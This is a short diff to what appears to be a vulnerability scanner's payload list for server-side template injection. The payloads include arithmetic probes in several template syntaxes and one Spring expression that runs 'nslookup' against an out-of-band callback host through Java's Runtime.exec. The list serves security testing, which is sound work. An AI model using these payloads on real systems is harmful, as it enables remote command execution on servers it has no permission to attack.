@@ -2,7 +2,7 @@
 {{.original}}${{3*313373133731337}}
 {{.original}}${{"{{"}}3*313373133731337{{"}}"}}
 {{.original}}<%= 3 * 313373133731337 %>
-{{.original}}${T(java.lang.Runtime).getRuntime().exec('nslookup {{.oob}}')}
+${T(java.lang.Runtime).getRuntime().exec('nslookup {{.oob}}')}
 {{.original}}#{ 3 * 313373133731337 }
 {{.original}}{{3*313373133731337}}
 {{.original}}{{3*313373133731337}\u0000}
